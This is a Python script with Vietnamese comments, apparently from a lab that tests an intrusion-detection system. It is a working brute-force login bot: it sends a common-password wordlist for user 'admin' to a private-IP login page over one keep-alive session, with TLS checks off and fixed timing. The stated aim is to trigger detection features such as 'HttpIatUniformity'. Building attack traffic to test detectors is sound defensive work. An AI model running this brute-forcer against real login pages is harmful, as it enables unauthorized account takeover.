"""
Brute Force bot dùng HTTP keep-alive để trigger F7 (HttpIatUniformity).

Khác với curl (1 connection/request), script này dùng requests.Session
để giữ TCP connection sống → nhiều POST /login qua cùng 1 flow →
F7 đo được IAT đều đặn → F7 ≈ 1.0

Dùng trong attacker namespace:
    SSLKEYLOGFILE=/tmp/tls_keys.log python3 brute_keepalive.py

Hoặc qua nsenter:
    sudo nsenter -n -t <attacker_pid> bash -c \
        'SSLKEYLOGFILE=/tmp/tls_keys.log python3 /path/to/brute_keepalive.py'
"""

import os
import sys
import time
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET   = "https://192.168.10.10/login"
USERNAME = "admin"
DELAY    = 0.05   # 50ms giữa các request → CV ≈ 0 → F7 ≈ 1.0
COUNT    = 30     # số lần thử trong 1 session

WORDLIST = [
    "password", "123456", "admin", "admin123", "letmein",
    "qwerty", "abc123", "monkey", "1234567", "dragon",
    "master", "sunshine", "princess", "welcome", "shadow",
    "superman", "michael", "football", "password1", "iloveyou",
    "pass1234", "admin@123", "root", "toor", "test123",
    "demo", "guest", "login", "secret", "changeme",
]


def run():
    keylog = os.environ.get("SSLKEYLOGFILE", "")
    if not keylog:
        print("[!] SSLKEYLOGFILE not set — F6/F7/F8 sẽ không được tshark decrypt")
        print("    Chạy: SSLKEYLOGFILE=/tmp/tls_keys.log python3 brute_keepalive.py")
    else:
        print(f"[+] SSLKEYLOGFILE={keylog}")

    # 1 Session = 1 TCP connection (keep-alive) → F7 hoạt động
    session = requests.Session()
    session.verify = False

    print(f"[+] Target: {TARGET}")
    print(f"[+] Delay:  {DELAY}s between requests → F7 sẽ cao (bot timing)")
    print(f"[+] Count:  {COUNT} requests\n")

    ok = 0
    for i, pwd in enumerate(WORDLIST[:COUNT]):
        try:
            resp = session.post(
                TARGET,
                data={"username": USERNAME, "password": pwd},
                timeout=5,
                allow_redirects=False,
            )
            status = resp.status_code
            # Login thành công thường redirect 302
            result = "HIT" if status in (302, 301) else f"fail({status})"
            print(f"  [{i+1:02d}] {USERNAME}:{pwd:<20} → {result}")
            if status in (302, 301):
                ok += 1
        except Exception as e:
            print(f"  [{i+1:02d}] ERROR: {e}")

        time.sleep(DELAY)

    print(f"\n[+] Done. {ok}/{COUNT} hits.")
    print("[+] F7 expected ≈ 1.0 (requests đều {:.0f}ms)".format(DELAY * 1000))
    print("[+] F6 expected = 1.0 (100% requests tới /login)")
    print("[+] F8 expected ≈ 1.0 (payload size đồng đều)")


if __name__ == "__main__":
    run()
